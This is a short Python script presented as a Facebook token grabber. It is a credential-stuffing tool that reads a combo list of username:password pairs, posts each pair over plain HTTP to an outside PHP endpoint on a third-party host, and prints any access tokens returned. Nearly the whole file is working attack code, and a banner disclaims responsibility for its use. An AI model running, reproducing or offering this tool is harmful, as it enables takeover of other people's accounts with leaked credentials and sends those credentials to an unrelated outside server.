#!/usr/bin/python
#coding: utf-8
#Code By : Gad
import requests, json
gad ="[+]Facebook Get Token By Combo [+]\n[+]Coded: @Gad990   (Telegram)[+]\n Date: 26/01/2018 \n[+]Changing the Description of this tool Won't made you the coder ^_^[+]\n[+]I take no responsibilities for the use of this program[+] "
print(gad)
combo = input('Enter Combo text File >>')
var = open(combo, 'r').readlines()
for line in var:
	combo = line.strip()
	user, pas =line.split(":")
	url = 'http://ahmed-gad-for-dev-com.stackstaging.com/gad.php?u='+user+'&p='+pas+''
	http = requests.post(url)
	content = http.content
	data = json.loads(content.decode("utf-8"))
	if "session_key" in data:
                print(data["access_token"])
